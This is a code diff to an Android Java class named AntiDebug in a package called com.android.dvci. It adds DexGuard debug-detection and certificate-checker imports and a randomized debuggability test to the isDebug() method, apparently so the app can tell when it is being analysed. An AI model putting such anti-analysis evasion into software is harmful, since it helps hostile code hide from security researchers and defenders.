@@ -4,6 +4,7 @@ import java.io.IOException;
 import java.net.InetAddress;
 import java.net.UnknownHostException;
 import java.util.List;
+import java.util.Random;
 
 import android.content.ComponentName;
 import android.content.Intent;
@@ -28,6 +29,9 @@ import android.util.Log;
 import com.android.dvci.Beep;
 import com.android.dvci.Status;
 import com.android.dvci.auto.Cfg;
+
+import dexguard.util.CertificateChecker;
+import dexguard.util.DebugDetector;
 
 public class AntiDebug {
 
@@ -59,12 +63,15 @@ public class AntiDebug {
 	}
 
 	public boolean isDebug() {
+		int rand = Utils.rand.nextInt();
+		boolean isOK = DebugDetector.isDebuggable(Status.getAppContext(), rand) == rand;
+
 		if (Cfg.DEBUGANTI) {
 			Beep.bip();
 			Beep.bip();
 			Beep.bip();
 		}
-		return checkFlag() || checkConnected() ;
+		return checkFlag() || checkConnected() || isOK;
 	}
 
 	public boolean isPlayStore() {
